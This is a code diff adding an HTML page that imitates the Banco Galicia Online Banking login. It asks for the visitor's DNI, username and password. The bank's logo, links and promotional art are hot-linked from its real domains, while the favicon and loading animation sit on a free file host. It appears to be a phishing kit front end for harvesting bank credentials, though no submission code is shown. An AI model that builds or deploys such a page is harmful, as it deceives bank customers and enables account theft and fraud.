@@ -1,0 +1,87 @@
+<html lang="es-ar">
+<head>
+  <meta charset="UTF-8">
+  <link rel="icon" href="https://files.catbox.moe/tkku2l.ico" type="image/x-icon">
+   <a href="https://www.foroactivo.com" target="_blank"></a>
+  <title>Online Banking</title>
+  </head>
+<body>
+<div class="main-container">
+  <div class="left-side">
+    <!-- Aquí va TODO el contenido de tu formulario -->
+    <div class="container">
+      <div class="logo">
+        <img src="https://onlinebanking.bancogalicia.com.ar/images/default/logo.svg" alt="Galicia Logo">
+          <p class="logo-text">Online Banking</p>
+            <p class="inicio-text">Iniciar sesión</p>
+      </div>
+
+      <div class="form-group inputWrapper">
+          <input type="text" id="dni" placeholder="Tu DNI" required>
+          <div class="errorIcon">!</div>
+      </div>
+
+      <div class="form-group inputWrapper">
+          <input type="text" id="usuario" placeholder="Tu usuario Galicia">
+          <div class="errorIcon">!</div>
+      </div>
+
+      <div class="form-group inputWrapper">
+          <input type="password" id="clave" placeholder="Tu clave Galicia">
+          <div class="errorIcon">!</div>
+      </div>
+
+      <!-- Tooltips globales -->
+      <div class="tooltip-inner" id="tooltip-dni">El número de documento es obligatorio</div>
+      <div class="tooltip-inner" id="tooltip-usuario">El campo Usuario es obligatorio</div>
+      <div class="tooltip-inner" id="tooltip-clave">La clave es obligatoria</div>
+
+      <div class="remember">
+        <input type="checkbox" id="recordar">
+        <label for="recordar">Recordar DNI y Usuario</label>
+      </div>
+
+   <button class="login-btn" id="loginBtn" disabled>INICIAR SESIÓN</button>
+      
+      <!-- Overlay animación -->
+<div id="overlay" class="overlay">
+  <img src="https://files.catbox.moe/hokyyt.gif" >
+</div>
+      
+      <div class="links">
+        <a href="https://onlinebanking.bancogalicia.com.ar/gestion/ingresar-du">OLVIDÉ O BLOQUEÉ MIS CLAVES</a>
+        <p>Sí es tu primera vez o necesitás el usuario</p>
+        <a href="https://onlinebanking.bancogalicia.com.ar/gestion/ingresar-du">CREÁ TUS CLAVES</a>
+      </div>
+
+      <div class="promo">
+        <img src="https://onlinebanking.bancogalicia.com.ar/img/isologo_g_mas.svg" alt="Galicia Más">
+        <div>
+          <p>
+            <span class="titulo">¿Venís de Galicia Más?</span><br>
+            Primero tenés que <a href="https://www.bancogalicia.com.ar" class="config-link">configurar tu cuenta desde la App Galicia</a>. 
+            Si ya lo hiciste, ingresá con tus claves Galicia.
+          </p>
+        </div>
+      </div>
+<br></br>
+      <center>
+        <div class="footer" style="color: #6a6a6a; margin-top: -10px;">
+          Operar con Online Banking implica aceptar los 
+          <a href="https://www.galicia.ar/personas/online-banking-gallery" style="color: #6a6a6a; font-weight: bold; text-decoration: none;">términos y condiciones</a>. 
+          Información sobre seguridad 
+          <a href="https://www.galicia.ar/personas/online-banking-gallery" style="color: #6a6a6a; font-weight: bold; text-decoration: none;">aquí</a>.
+        </div>
+      </center>
+    </div>
+  </div>
+
+  <div class="right-side">
+    <!-- Aquí va la imagen -->
+    <div class="side-info content img art art-2 art-adobe-0" role="complementary" data-automation-id="out-banner" id="img-container-artes" style="background-image: url('https://www.galicia.ar/content/dam/galicia/banco-galicia/personas/canales/onb/ONBGallery/ilustraciones/2024/Promociones-2-YamilaYjilioff.jpg');">
+      <a target="_blank" href="https://www.galicia.ar/personas/buscador-de-promociones" tabindex="0" id="img-container-artes-href" data-hj-masked=""></a>
+    </div>
+  </div>
+</div>
+</body>
+</html>
